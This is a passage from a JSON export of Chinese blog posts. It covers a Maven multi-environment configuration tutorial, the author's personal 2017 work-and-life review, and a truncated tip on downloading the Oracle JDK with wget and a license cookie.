class=\"hljs-title\">properties</span>&gt;</span>\n        <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">env</span>&gt;</span>test<span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">env</span>&gt;</span>\n      <span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">properties</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">profile</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">profile</span>&gt;</span>\n      <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">id</span>&gt;</span>production<span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">id</span>&gt;</span>\n      <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">properties</span>&gt;</span>\n        <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">env</span>&gt;</span>production<span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">env</span>&gt;</span>\n      <span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">properties</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">profile</span>&gt;</span>\n  <span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">profiles</span>&gt;</span></code></pre>\n\n<p>在本段代码中，我们将local设置为默认的环境变量，那么在我们打包的过程中如果不置顶环境变量，maven将按照默认的local形式进行打包。我们为每个profile设置了一个<code>env</code>的变量值，该值可以让我们在其他部分配置直接引用。</p>\n\n<ul>\n<li>配置filter</li>\n</ul>\n\n\n\n<pre class=\"prettyprint\"><code class=\"language-xml hljs \">    <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">filters</span>&gt;</span>\n        <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">filter</span>&gt;</span>src/main/resource/${env}/application.properties<span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">filter</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">filters</span>&gt;</span></code></pre>\n\n<p>通过filter，我们可以将不同环境目录下的application.properties文件中的参数值加载到maven中，如果我们有多个properties可以在添加一个filter即可。</p>\n\n<ul>\n<li>配置resources</li>\n</ul>\n\n\n\n<pre class=\"prettyprint\"><code class=\"language-xml hljs \">        <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">resources</span>&gt;</span>\n            <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">resource</span>&gt;</span>\n                <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">directory</span>&gt;</span>src/main/resources<span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">directory</span>&gt;</span>\n                <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">filtering</span>&gt;</span>true<span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">filtering</span>&gt;</span>\n                <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">excludes</span>&gt;</span>\n                    <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">exclude</span>&gt;</span>local/*<span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">exclude</span>&gt;</span>\n                    <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">exclude</span>&gt;</span>development/*<span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">exclude</span>&gt;</span>\n                    <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">exclude</span>&gt;</span>test/*<span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">exclude</span>&gt;</span>\n                    <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">exclude</span>&gt;</span>production/*<span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">exclude</span>&gt;</span>\n                <span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">excludes</span>&gt;</span>\n            <span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">resource</span>&gt;</span>\n        <span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">resources</span>&gt;</span></code></pre>\n\n<p>通过指定<code>filtering</code>表示该目录下的文件都将通过maven的过滤进行变量值的替换，并且我们将源代码中的多环境目录进行排除，在maven编译生成的目录将不会带目录文件。</p>\n\n\n\n<h3 id=\"配置applicationproperties文件\">配置application.properties文件</h3>\n\n<p>在src/main/resources/目录下新建一个application.properties，并添加内容</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs avrasm\">test<span class=\"hljs-preprocessor\">.properties</span>=@test<span class=\"hljs-preprocessor\">.properties</span>@</code></pre>\n\n<p>此处的@test.properties@为通过fileter筛选各自环境下的加入到maven的变量值。 <br>\n例如<code>src/main/resources/production/applicaiton.properties</code>文件内容为:</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs fix\"><span class=\"hljs-attribute\">test.properties</span>=<span class=\"hljs-string\">production</span></code></pre>\n\n<p>maven在编译的过程中会替换 @test.properties@为production，最终生成的application.properties文件内容应该为:</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs fix\"><span class=\"hljs-attribute\">test.properties</span>=<span class=\"hljs-string\">production</span></code></pre>\n\n<hr>\n\n<p>通过上面的讲解和代码配置，我们完成了maven多环境变量的配置工作，接下来我们来使用maven编译试试？</p>\n\n<ul>\n<li>通过命令进行打包</li>\n</ul>\n\n\n\n<pre class=\"prettyprint\"><code class=\"language-bash hljs \">mvn clean compile  -Pproduction</code></pre>\n\n<ul>\n<li>查看目录文件生成情况</li>\n</ul>\n\n<p><img src=\"http://upload-images.jianshu.io/upload_images/1489067-7c5f529dad0400e2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\" alt=\"image.png\" title=\"\"></p>\n\n\n\n<h3 id=\"常见问题\">常见问题</h3>\n\n<p>maven在替换变量的时候，默认<span class=\"MathJax_Preview\" style=\"color: inherit; display: none;\"></span><span class=\"MathJax\" id=\"MathJax-Element-1-Frame\" tabindex=\"0\" style=\"position: relative;\" data-mathml=\"<math xmlns=&quot;http://www.w3.org/1998/Math/MathML&quot;><merror><mtext>{]&amp;#x548C;@@&amp;#x8868;&amp;#x8FBE;&amp;#x5F0F;&amp;#x5747;&amp;#x53EF;&amp;#x66FF;&amp;#x6362;&amp;#xFF0C;&amp;#x5982;&amp;#x679C;&amp;#x6211;&amp;#x4EEC;&amp;#x5728;spring&amp;#xA0;&amp;#x7684;xml&amp;#x914D;&amp;#x7F6E;&amp;#x6587;&amp;#x4EF6;&amp;#x4E2D;&amp;#x4F7F;&amp;#x7528;</mtext></merror></math>\" role=\"presentation\"><span class=\"math\" id=\"MathJax-Span-1\" style=\"\" aria-hidden=\"true\"><span class=\"noError\" id=\"MathJax-Span-2\" style=\"display: inline-block;\">{]和@@表达式均可替换，如果我们在spring&nbsp;的xml配置文件中使用</span></span><span class=\"MJX_Assistive_MathML\" role=\"presentation\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><merror><mtext>{]和@@表达式均可替换，如果我们在spring&nbsp;的xml配置文件中使用</mtext></merror></math></span></span><script type=\"math/tex\" id=\"MathJax-Element-1\">{]和@@表达式均可替换，如果我们在spring 的xml配置文件中使用</script>{} 也会被maven替换掉，为了避免该问题，我们可以参考<code>spring boot</code>的parent中的xml进行配置</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs xml\"> <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">plugin</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">groupId</span>&gt;</span>org.apache.maven.plugins<span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">groupId</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">artifactId</span>&gt;</span>maven-resources-plugin<span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">artifactId</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">version</span>&gt;</span>2.6<span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">version</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">configuration</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">delimiters</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">delimiter</span>&gt;</span>@<span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">delimiter</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">delimiters</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">useDefaultDelimiters</span>&gt;</span>false<span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">useDefaultDelimiters</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">configuration</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">plugin</span>&gt;</span></code></pre>\n\n<p>重点是<strong>delimiter</strong>的配置，该配置主要配置变量的分隔符，我们配置为@，那么它就不会对${}产生作用了，具体说明可以参考maven的官方文档 <a href=\"https://maven.apache.org/plugins/maven-resources-plugin/resources-mojo.html#delimiters\">maven delimiters</a></p>\n\n<hr>\n\n<h3 id=\"结语\">结语</h3>\n\n<p>通过上面的展示，想必我们都已经学会使用maven的多环境配置了，本段的demo我也传到github上，大家可以自行查看具体源代 —– <a href=\"https://github.com/yoqu/study-mvn-profiles\">github源代码</a></p>",
			"markdowncontent":"在工作中，我们经常遇到多环境需要不同的配置文件，例如不同环境下连接的数据库不一致。\n在`spring boot`项目中可以较为方便的集成，那么在传统的`spring web`项目中应该如何解决这个问题呢，下面我们尝试使用maven的filter进行处理不同环境的变量值。\n\n### 配置pom文件\n\n* 为pom文件添加profile的配置\n\n```xml\n <profiles>\n    <profile>\n      <id>local</id>\n      <activation>\n        <activeByDefault>true</activeByDefault>\n      </activation>\n      <properties>\n        <env>local</env>\n      </properties>\n    </profile>\n    <profile>\n      <id>development</id>\n      <properties>\n        <env>development</env>\n      </properties>\n    </profile>\n    <profile>\n      <id>test</id>\n      <properties>\n        <env>test</env>\n      </properties>\n    </profile>\n    <profile>\n      <id>production</id>\n      <properties>\n        <env>production</env>\n      </properties>\n    </profile>\n  </profiles>\n```\n在本段代码中，我们将local设置为默认的环境变量，那么在我们打包的过程中如果不置顶环境变量，maven将按照默认的local形式进行打包。我们为每个profile设置了一个`env`的变量值，该值可以让我们在其他部分配置直接引用。\n\n* 配置filter\n```xml\n    <filters>\n        <filter>src/main/resource/${env}/application.properties</filter>\n    </filters>\n```\n通过filter，我们可以将不同环境目录下的application.properties文件中的参数值加载到maven中，如果我们有多个properties可以在添加一个filter即可。\n\n* 配置resources\n```xml\n        <resources>\n            <resource>\n                <directory>src/main/resources</directory>\n                <filtering>true</filtering>\n                <excludes>\n                    <exclude>local/*</exclude>\n                    <exclude>development/*</exclude>\n                    <exclude>test/*</exclude>\n                    <exclude>production/*</exclude>\n                </excludes>\n            </resource>\n        </resources>\n```\n通过指定`filtering`表示该目录下的文件都将通过maven的过滤进行变量值的替换，并且我们将源代码中的多环境目录进行排除，在maven编译生成的目录将不会带目录文件。\n\n### 配置application.properties文件\n在src/main/resources/目录下新建一个application.properties，并添加内容\n```\ntest.properties=@test.properties@\n```\n此处的@test.properties@为通过fileter筛选各自环境下的加入到maven的变量值。\n例如`src/main/resources/production/applicaiton.properties`文件内容为:\n```\ntest.properties=production\n```\nmaven在编译的过程中会替换 @test.properties@为production，最终生成的application.properties文件内容应该为:\n```\ntest.properties=production\n```\n\n\n----------------\n\n通过上面的讲解和代码配置，我们完成了maven多环境变量的配置工作，接下来我们来使用maven编译试试？\n\n* 通过命令进行打包\n```bash \nmvn clean compile  -Pproduction\n```\n\n* 查看目录文件生成情况\n\n![image.png](http://upload-images.jianshu.io/upload_images/1489067-7c5f529dad0400e2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n### 常见问题\n\nmaven在替换变量的时候，默认${]和@@表达式均可替换，如果我们在spring 的xml配置文件中使用${} 也会被maven替换掉，为了避免该问题，我们可以参考`spring boot`的parent中的xml进行配置\n```\n <plugin>\n\t<groupId>org.apache.maven.plugins</groupId>\n\t<artifactId>maven-resources-plugin</artifactId>\n\t<version>2.6</version>\n\t<configuration>\n\t<delimiters>\n\t<delimiter>@</delimiter>\n\t</delimiters>\n\t<useDefaultDelimiters>false</useDefaultDelimiters>\n\t</configuration>\n</plugin>\n```\n重点是**delimiter**的配置，该配置主要配置变量的分隔符，我们配置为@，那么它就不会对${}产生作用了，具体说明可以参考maven的官方文档 [maven delimiters](https://maven.apache.org/plugins/maven-resources-plugin/resources-mojo.html#delimiters)\n\n----------\n\n### 结语\n\n通过上面的展示，想必我们都已经学会使用maven的多环境配置了，本段的demo我也传到github上，大家可以自行查看具体源代 ----- [github源代码](https://github.com/yoqu/study-mvn-profiles)",
			"tags":"",
			"id":"79240839",
			"categories":"java,maven",
			"status":1
		},
		"error":"",
		"status":true
	},
	{
		"data":{
			"date":"2018年02月01日 20:07:32",
			"articleedittype":1,
			"private":0,
			"channel":"0",
			"description":"农历的新年的钟声即将敲响，借着昨日的蓝月亮，也是时候对自己个人的2017年做一番总结了。\n\n工作总结\n\n\n\n前言\n\n16年1月开始参加工作，到现在已经整整工作两年一月有余，从在校期间的特别期待踏出社会创造自己的个人价值到现在的习惯性工作，有空的时候顺便思考自己的人生价值，想不到时间竟然如此快，从学生到职场人生的转变，老实说我也不知道怎么转换，仿佛今日的自己就是昨天青葱校园的一少年。工作中最大的感受",
			"title":"2017年一年总结",
			"type":"original",
			"content":"<p>农历的新年的钟声即将敲响，借着昨日的蓝月亮，也是时候对自己个人的2017年做一番总结了。</p>\n\n<h2 id=\"工作总结\">工作总结</h2>\n\n\n\n<h3 id=\"前言\">前言</h3>\n\n<p>16年1月开始参加工作，到现在已经整整工作两年一月有余，从在校期间的特别期待踏出社会创造自己的个人价值到现在的习惯性工作，有空的时候顺便思考自己的人生价值，想不到时间竟然如此快，从学生到职场人生的转变，老实说我也不知道怎么转换，仿佛今日的自己就是昨天青葱校园的一少年。工作中最大的感受大概是从Y3离职加入讯飞把，在Y3践行一个原则，坚决不加班，在Y3的16年1-11月之间，从未加过一次班，每天都是准时5.30下班，在外企的管理下，这样下班很正常，但我在其中的感受是其实在工作中渐渐会丧失对于一些美好事物追求，丧失自己的工匠精神，既然选择了工作，那么希望自己的人生价值能够在工作中进行体现，所以来到了讯飞。</p>\n\n<h3 id=\"讯飞工作的这一年\">讯飞工作的这一年</h3>\n\n<p>初入讯飞时，便去合肥出差一个月，将项目从合肥接到成都进行研发，起初的一些天，我们项目组还有高级研发，可惜那哥们刚来没两天便又走了。只剩下咱们两初级开发做项目的研发，老实说，对项目的研发，其实我是没有太大信心的，因为自己的技术水平在做一些处理的时候可能没有经验老道的老鸟处理得好，同时感觉自己工作中没有更高级的coder来带领提高我的水平感觉苦恼，但是通过一年的工作，发现其实没有更高级的coder也能做的很好，通过自己去实践踩坑，走一些弯路来提升自己的经验。 <br>\n通过一年的工作，自我感觉融入了讯飞的大家庭，非常喜欢讯飞的421克拉的企业价值观，认同公司，也认同自己走的道路和公司的发展其实是非常密切的。对于加班这件事，在我融入讯飞后，其实感觉也挺正常的。无论任何事情，想要将其做好，做的完美都需要花大量的时间和心血在其中，如果仅仅上班8小时，仅够做出来而已，想要做好，路漫漫其修远兮。 <br>\n在团队中，没想到我的兰老大竟然是我的高中校友，咱们还一起在合肥住了一个月，想想也是缘分，当时还不知道是咱们的成都leader，哈哈。托老大的照顾，在快年底的时候加入成都基础研发团队。在十月份以前，老实说我对成都公司的研发们都不熟悉，没有一些机会相互认识熟悉。通过加入基础组件的研发团队。认识了趣味相投的王倩和福林，还有秋秋和志刚。感觉自己也还是挺幸运的，能够认识这么多的好朋友，恩。我们还在一起做分布式调度系统，一起愉快的coding感觉挺爽的。</p>\n\n<h3 id=\"工作中的不足\">工作中的不足</h3>\n\n<p>工作中的不足大概是自身的性格和做事风格产生一些不足。我自己习惯一个人做开发，在团队协作中，不太会组织团队做任务，习惯性自己单独去做处理，遇到问题的时候，我永远习惯自己一个人尽量去解决，只有解决的了的情况下再去询问别人，可能有一点日本人的对自己的严苛（尽量不麻烦别人）。造就了别人其实都知道的东西，可能我会花非常多的时间去尝试解决处理它。工作中，其实很多时候需要做文档输出，由于自身的惰性和语言组织能不够强所以不太想要做文档内容的输出，所以也导致了一年到了，感觉一年工作做了很多，其实大都没有文档进行输出证明，在公司的职级职等评定上更是吃了一次血亏。下年要谨记。</p>\n\n<h3 id=\"提升之处\">提升之处</h3>\n\n\n\n<h4 id=\"技术水平\">技术水平</h4>\n\n<p>在技术方面，提高较大的是多线程方面和对Spring源码的解读，并阅读了24种设计模式，对rpc的实现原理也有了一定了解，tcp通信有一点涉猎。</p>\n\n<p><strong>多线程</strong>： 多线程知识是由于业务上需要使用到，所以通过看白鹤翔老师的视频教程学习到的，了解了很多多线程的相关概念知识。对于线程池，原子性，同步锁，重入锁等等概念有了一定的掌握。</p>\n\n<p><strong>Spring源码</strong>： 在做公司的Spring分享教程时候，对Spring的代码进行了研读，对于Spring内部的实现进行了一些掌握，并能够通过Spring的一些IOC，DI的概念做出自己的实践，实现一套自己的“Spring”框架、</p>\n\n<p><strong>24种设计模式</strong>： 其实吧，设计模式还没有完全看完，年初的时候预定是一天看一种，没有坚持看完，大概看了10来种。对于创建型的设计模式全部学习了，但是在实践的过程中，可能自己并不能很好的将其完全实践出来，需要时间的打磨来提升自己的编码艺术水平。 <br>\n<strong>tcp</strong> ： 对于tcp的三次握手，四次挥手有了了解，并通过wireshark抓包工作进行实践，对于更具体的内容需要进一步阅读书籍来学习。</p>\n\n<h4 id=\"2018年想要提升的技术\">2018年想要提升的技术</h4>\n\n<p>18年，我要将24种设计模式全部掌握，并阅读rpc框架的源码，做一套更好的实现方案(已经实现了一个rpc框架，不过感觉设计不太好）。阅读更高质量的源码，自己通过理解在模仿进行学习提高自己的水平。 <br>\n18年还打算认真学习一些mq。仔细阅读rocketMq的源代码，对于原理进行剖析，自己实现一个微量级别的消息队列中间件 <br>\n18年学习golang语言，尝试接触一些其他的语言来提高自己的技术视野。</p>\n\n<h2 id=\"生活总结\">生活总结</h2>\n\n<p>17年的生活平凡又不平凡，可能是17年在外吃饭的次数比去年多了很多，中午也带饭的次数越来越少，可能是真的融入了上班生活？当一条工作狗了。在讯飞挺爽的一点是经常团建，胡老大经常带咱们几个伙伴去外面吃饭，其实我对于自己的饮食方面挺随意的，或者说不太想去外面的餐厅吃饭，感觉都差不多嘛~</p>\n\n<p>今年雪雪裸辞了一段时间，在家自学，其实从内心来说，不太希望雪雪裸辞（主要是下家还没找到？），但是女孩子嘛，我也不能强行要求呀。所以在家的那段时间我反正挺舒服的，每天下班回家都有饭菜吃，不过雪雪在家自学不够坚定，每天反而是浑浑噩噩，可能我自己也没有很好的指导，这点我也需要反思一下。因为自己没有学过测试，所以就有理由不自己学了再去教会？技术都是想通的，确实没有做好教学指导工作，在找工作的过程中，也四处碰壁，其实很正常。本来在测试行业供特别大于需，在加上自己的履历不够光鲜，很好有公司需要你。想起我自己真的挺幸运的，每一次都能遇到很好的机会。但是有一句话是越努力，越幸运，相信自己，我们努力了，都会有回报。最后雪雪去做了行政，转眼一想，其实行政工作也挺好的，可以锻炼自己的交际能力，能够多和人打交道，不会像IT工作者每天都对着电脑。</p>\n\n<p>17年生活就像白开水一样，没有太多的味道，不过添加一些白糖，用上某夫某泉，让咱们的白开水看起来乏味，但却甘甜可口。听了张韶涵唱的阿刁，就像她自己所说非常喜欢里面的一句歌词“甘于平凡却不甘平凡的溃败”，我们每个人都是非常的平凡，但是在平凡的人生中，我们总需要给生活留一些念想，让自己能够活的更充实，那就是一种力量，不甘于溃败的力量，让自己感觉自己却又有那么的一丝不平凡。 <br>\n许巍的的歌词：“生活不止眼前的苟且，还有诗和远方的田野”。</p>\n\n<h2 id=\"18年干点啥\">18年干点啥</h2>\n\n<p>18年，希望能够有时间多回家看看家里的老人，希望能够迈开自己的步子，试着外面旅游，看看祖国的大好河山。</p>",
			"markdowncontent":"农历的新年的钟声即将敲响，借着昨日的蓝月亮，也是时候对自己个人的2017年做一番总结了。\n\n## 工作总结\n\n### 前言\n\n16年1月开始参加工作，到现在已经整整工作两年一月有余，从在校期间的特别期待踏出社会创造自己的个人价值到现在的习惯性工作，有空的时候顺便思考自己的人生价值，想不到时间竟然如此快，从学生到职场人生的转变，老实说我也不知道怎么转换，仿佛今日的自己就是昨天青葱校园的一少年。工作中最大的感受大概是从Y3离职加入讯飞把，在Y3践行一个原则，坚决不加班，在Y3的16年1-11月之间，从未加过一次班，每天都是准时5.30下班，在外企的管理下，这样下班很正常，但我在其中的感受是其实在工作中渐渐会丧失对于一些美好事物追求，丧失自己的工匠精神，既然选择了工作，那么希望自己的人生价值能够在工作中进行体现，所以来到了讯飞。\n\n### 讯飞工作的这一年\n\n初入讯飞时，便去合肥出差一个月，将项目从合肥接到成都进行研发，起初的一些天，我们项目组还有高级研发，可惜那哥们刚来没两天便又走了。只剩下咱们两初级开发做项目的研发，老实说，对项目的研发，其实我是没有太大信心的，因为自己的技术水平在做一些处理的时候可能没有经验老道的老鸟处理得好，同时感觉自己工作中没有更高级的coder来带领提高我的水平感觉苦恼，但是通过一年的工作，发现其实没有更高级的coder也能做的很好，通过自己去实践踩坑，走一些弯路来提升自己的经验。\n通过一年的工作，自我感觉融入了讯飞的大家庭，非常喜欢讯飞的421克拉的企业价值观，认同公司，也认同自己走的道路和公司的发展其实是非常密切的。对于加班这件事，在我融入讯飞后，其实感觉也挺正常的。无论任何事情，想要将其做好，做的完美都需要花大量的时间和心血在其中，如果仅仅上班8小时，仅够做出来而已，想要做好，路漫漫其修远兮。\n在团队中，没想到我的兰老大竟然是我的高中校友，咱们还一起在合肥住了一个月，想想也是缘分，当时还不知道是咱们的成都leader，哈哈。托老大的照顾，在快年底的时候加入成都基础研发团队。在十月份以前，老实说我对成都公司的研发们都不熟悉，没有一些机会相互认识熟悉。通过加入基础组件的研发团队。认识了趣味相投的王倩和福林，还有秋秋和志刚。感觉自己也还是挺幸运的，能够认识这么多的好朋友，恩。我们还在一起做分布式调度系统，一起愉快的coding感觉挺爽的。\n\n\n### 工作中的不足\n\n工作中的不足大概是自身的性格和做事风格产生一些不足。我自己习惯一个人做开发，在团队协作中，不太会组织团队做任务，习惯性自己单独去做处理，遇到问题的时候，我永远习惯自己一个人尽量去解决，只有解决的了的情况下再去询问别人，可能有一点日本人的对自己的严苛（尽量不麻烦别人）。造就了别人其实都知道的东西，可能我会花非常多的时间去尝试解决处理它。工作中，其实很多时候需要做文档输出，由于自身的惰性和语言组织能不够强所以不太想要做文档内容的输出，所以也导致了一年到了，感觉一年工作做了很多，其实大都没有文档进行输出证明，在公司的职级职等评定上更是吃了一次血亏。下年要谨记。\n\n### 提升之处\n\n#### 技术水平\n在技术方面，提高较大的是多线程方面和对Spring源码的解读，并阅读了24种设计模式，对rpc的实现原理也有了一定了解，tcp通信有一点涉猎。\n\n**多线程**： 多线程知识是由于业务上需要使用到，所以通过看白鹤翔老师的视频教程学习到的，了解了很多多线程的相关概念知识。对于线程池，原子性，同步锁，重入锁等等概念有了一定的掌握。\n\n**Spring源码**： 在做公司的Spring分享教程时候，对Spring的代码进行了研读，对于Spring内部的实现进行了一些掌握，并能够通过Spring的一些IOC，DI的概念做出自己的实践，实现一套自己的“Spring”框架、\n\n**24种设计模式**： 其实吧，设计模式还没有完全看完，年初的时候预定是一天看一种，没有坚持看完，大概看了10来种。对于创建型的设计模式全部学习了，但是在实践的过程中，可能自己并不能很好的将其完全实践出来，需要时间的打磨来提升自己的编码艺术水平。\n**tcp** ： 对于tcp的三次握手，四次挥手有了了解，并通过wireshark抓包工作进行实践，对于更具体的内容需要进一步阅读书籍来学习。\n\n#### 2018年想要提升的技术\n18年，我要将24种设计模式全部掌握，并阅读rpc框架的源码，做一套更好的实现方案(已经实现了一个rpc框架，不过感觉设计不太好）。阅读更高质量的源码，自己通过理解在模仿进行学习提高自己的水平。\n18年还打算认真学习一些mq。仔细阅读rocketMq的源代码，对于原理进行剖析，自己实现一个微量级别的消息队列中间件\n18年学习golang语言，尝试接触一些其他的语言来提高自己的技术视野。\n\n## 生活总结\n\n17年的生活平凡又不平凡，可能是17年在外吃饭的次数比去年多了很多，中午也带饭的次数越来越少，可能是真的融入了上班生活？当一条工作狗了。在讯飞挺爽的一点是经常团建，胡老大经常带咱们几个伙伴去外面吃饭，其实我对于自己的饮食方面挺随意的，或者说不太想去外面的餐厅吃饭，感觉都差不多嘛~\n\n今年雪雪裸辞了一段时间，在家自学，其实从内心来说，不太希望雪雪裸辞（主要是下家还没找到？），但是女孩子嘛，我也不能强行要求呀。所以在家的那段时间我反正挺舒服的，每天下班回家都有饭菜吃，不过雪雪在家自学不够坚定，每天反而是浑浑噩噩，可能我自己也没有很好的指导，这点我也需要反思一下。因为自己没有学过测试，所以就有理由不自己学了再去教会？技术都是想通的，确实没有做好教学指导工作，在找工作的过程中，也四处碰壁，其实很正常。本来在测试行业供特别大于需，在加上自己的履历不够光鲜，很好有公司需要你。想起我自己真的挺幸运的，每一次都能遇到很好的机会。但是有一句话是越努力，越幸运，相信自己，我们努力了，都会有回报。最后雪雪去做了行政，转眼一想，其实行政工作也挺好的，可以锻炼自己的交际能力，能够多和人打交道，不会像IT工作者每天都对着电脑。\n\n17年生活就像白开水一样，没有太多的味道，不过添加一些白糖，用上某夫某泉，让咱们的白开水看起来乏味，但却甘甜可口。听了张韶涵唱的阿刁，就像她自己所说非常喜欢里面的一句歌词“甘于平凡却不甘平凡的溃败”，我们每个人都是非常的平凡，但是在平凡的人生中，我们总需要给生活留一些念想，让自己能够活的更充实，那就是一种力量，不甘于溃败的力量，让自己感觉自己却又有那么的一丝不平凡。\n许巍的的歌词：“生活不止眼前的苟且，还有诗和远方的田野”。\n\n## 18年干点啥\n\n18年，希望能够有时间多回家看看家里的老人，希望能够迈开自己的步子，试着外面旅游，看看祖国的大好河山。\n",
			"tags":"",
			"id":"79232751",
			"categories":"",
			"status":2
		},
		"error":"",
		"status":true
	},
	{
		"data":{
			"date":"2017年11月23日 18:30:22",
			"articleedittype":1,
			"private":0,
			"channel":"12",
			"description":"最近在服务器上安装jdk遇到一个问题，oracle官网下载jdk都需要同意它的license才能下载，所有直接使用wget xxx会下载到它的html文件，并不能下载真实文件。解决办法：UPDATED FOR JDK 9 it looks like you can download it now directly from java.net without sending a headerwget",
			"title":"使用linux 命令行下载oracle官网jdk失败处理方法",
			"type":"translated",
			"content":"<p>最近在服务器上安装jdk遇到一个问题，oracle官网下载jdk都需要同意它的license才能下载，所有直接使用<code>wget xxx</code>会下载到它的html文件，并不能下载真实文件。</p>\n\n<p><strong>解决办法</strong>：</p>\n\n<p>UPDATED FOR JDK 9 it looks like you can download it now directly from java.net without sending a header</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs avrasm\">wget http://download<span class=\"hljs-preprocessor\">.java</span><span class=\"hljs-preprocessor\">.net</span>/java/GA/jdk9/<span class=\"hljs-number\">9</span>/binaries/jdk-<span class=\"hljs-number\">9</span>+<span class=\"hljs-number\">181</span>_linux-x64_bin<span class=\"hljs-preprocessor\">.tar</span><span class=\"hljs-preprocessor\">.gz</span></code></pre>\n\n<p>UPDATED FOR JDK 8u151 <br>\nTAR GZ:</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs lasso\">wget <span class=\"hljs-subst\">--</span>no<span class=\"hljs-attribute\">-check</span><span class=\"hljs-attribute\">-certificate</span> <span class=\"hljs-attribute\">-c</span> <span class=\"hljs-subst\">--</span><span class=\"hljs-keyword\">header</span> <span class=\"hljs-string\">\"Cookie: oraclelicense=accept-securebackup-cookie\"</span> http:<span class=\"hljs-comment\">//download.oracle.com/otn-pub/java/jdk/8u151-b12/e758a0de34e24606bca991d704f6dcbf/jdk-8u151-linux-x64.tar.gz</span></code></pre>\n\n<p>UPDATED FOR JDK 8u151 <br>\nTAR GZ:</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs perl\">wget --<span class=\"hljs-keyword\">no</span>-cookies --<span class=\"hljs-keyword\">no</span>-check-certificate --header <span class=\"hljs-string\">\"Cookie: gpw_e24=http<span class=\"hljs-variable\">%3A</span><span class=\"hljs-variable\">%2F</span><span class=\"hljs-variable\">%2Fwww</span>.oracle.com<span class=\"hljs-variable\">%2F</span>; oraclelicense=accept-securebackup-cookie\"</span> <span class=\"hljs-string\">\"http://download.oracle.com/otn-pub/java/jdk/8u151-b12/e758a0de34e24606bca991d704f6dcbf/jdk-8u151-linux-x64.tar.gz\"</span>\nRPM:\n\nwget --<span class=\"hljs-keyword\">no</span>-cookies --<span class=\"hljs-keyword\">no</span>-check-certificate --header <span class=\"hljs-string\">\"Cookie: gpw_e24=http<span class=\"hljs-variable\">%3A</span><span class=\"hljs-variable\">%2F</span><span class=\"hljs-variable\">%2Fwww</span>.oracle.com<span class=\"hljs-variable\">%2F</span>; oraclelicense=accept-securebackup-cookie\"</span> <span class=\"hljs-string\">\"http://download.oracle.com/otn-pub/java/jdk/8u151-b12/e758a0de34e24606bca991d704f6dcbf/jdk-8u151-linux-x64.rpm\"</span></code></pre>\n\n<p>UPDATED FOR JDK 8u131 <br>\nRPM:</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs avrasm\">  wget -c --header <span class=\"hljs-string\">\"Cookie: oraclelicense=accept-securebackup-cookie\"</span> http://download<span class=\"hljs-preprocessor\">.oracle</span><span class=\"hljs-preprocessor\">.com</span>/otn-pub/java/jdk/<span class=\"hljs-number\">8</span>u131-b11/d54c1d3a095b4ff2b6607d096fa80163/jdk-<span class=\"hljs-number\">8</span>u131-linux-x64<span 